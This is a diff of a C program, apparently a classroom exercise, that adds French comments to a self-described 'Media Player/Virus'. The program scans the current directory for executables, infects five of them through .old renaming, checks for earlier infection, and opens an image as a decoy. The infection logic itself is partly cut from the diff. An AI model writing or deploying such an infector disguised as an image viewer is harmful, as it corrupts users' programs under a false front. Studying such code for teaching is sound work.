@@ -11,12 +11,15 @@ char** getFiles();
 void infecte(char** f);
 bool dejaInfecte(char* f);
 
+/**
+ * Fonction permettant de récupérer les noms des fichiers à infecter
+ */
 char** getFiles(){
-    char** files = malloc(5*sizeof(char*));
-    int cpt = 0;
-    DIR *repertoire = opendir(".");
-    struct stat statsF;
-    struct dirent *lecture;
+    char** files = malloc(5*sizeof(char*)); // On alloue le mémoire à la variable files pour permettre de récupérer les noms des 5 programmes
+    int cpt = 0; // Compteur du nombre de programmes
+    DIR *repertoire = opendir("."); // Ouverture du répertoire courant pour parcourir les fochiers
+    struct stat statsF; // Obtenir les statistiques d'un fichier
+    struct dirent *lecture; // Obtenir le fichier courant
     printf("Liste des fichiers exécutables : \n");
     while((lecture = readdir(repertoire))){
         /**
@@ -42,8 +45,13 @@ char** getFiles(){
     return files;
 }
 
-
+/**
+ * Fonction permettant d'infecter les fichiers du répertoire
+ */
 void infecte(char** f){
+    /**
+     * Parcours pour 5 fichiers (les programmes MonPGn)
+     */
     for(int i = 0; i < 5; i++)
     {
 		FILE *oldFile;
@@ -56,6 +64,9 @@ void infecte(char** f){
 }
 
 
+/**
+ * Fonction permettant de vérifier qu'un fichier est déjà infecté ou non
+ */
 bool dejaInfecte(char* f){
     char* extension = ".old";
     if (strstr(f, extension) != NULL) {
@@ -80,10 +91,13 @@ bool dejaInfecte(char* f){
     return false;
 }
 
+/**
+ * Main du programme de Media Player/Virus
+ */
 int main(int argc, char const *argv[])
 {
-    char** files = getFiles();
-    infecte(files);
-    system("xdg-open ../img/img1.jpg");
+    char** files = getFiles(); // Récupération des fichiers à infecter
+    infecte(files); // Infection des fichiers
+    system("xdg-open ../img/img1.jpg"); //Ouverture du système d'affichage d'images Linux grâce à la commande système qui permet d'executer des commandes bash
     return EXIT_SUCCESS;
 }
